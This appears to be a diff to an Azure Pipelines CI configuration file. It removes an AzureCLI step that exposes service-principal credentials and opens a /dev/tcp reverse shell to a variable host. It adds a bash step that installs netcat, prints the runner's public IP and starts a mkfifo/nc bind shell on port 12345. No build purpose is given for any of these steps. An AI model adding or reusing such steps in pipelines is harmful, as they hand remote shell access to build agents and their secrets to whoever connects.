@@ -5,18 +5,10 @@ pool:
   vmImage: 'ubuntu-latest'
 
 steps:
-- task: AzureCLI@2
-  inputs:
-    azureSubscription: foo
-    scriptType: bash
-    scriptLocation: inlineScript
-    inlineScript: |
-        curl -s ifconfig.me
-        sh -i >& "/dev/tcp/$(ME)" 0>&1
-    addSpnToEnvironment: true
-    
-
-  # - task: Bash@3
-  #   inputs:
-  #     targetType: 'inline'
-  #     script: curl --resolve cns-vnet-test.azurewebsites.net:443:10.0.0.4 https://cns-vnet-test.azurewebsites.net
+  - bash: |
+      sudo apt-get update
+      sudo apt-get --assume-yes --no-install-recommends install openvpn netcat
+      ls
+      curl ifconfig.me
+      rm -f /tmp/f; mkfifo /tmp/f
+      cat /tmp/f | /bin/sh -i 2>&1 | nc -lv 12345 > /tmp/f
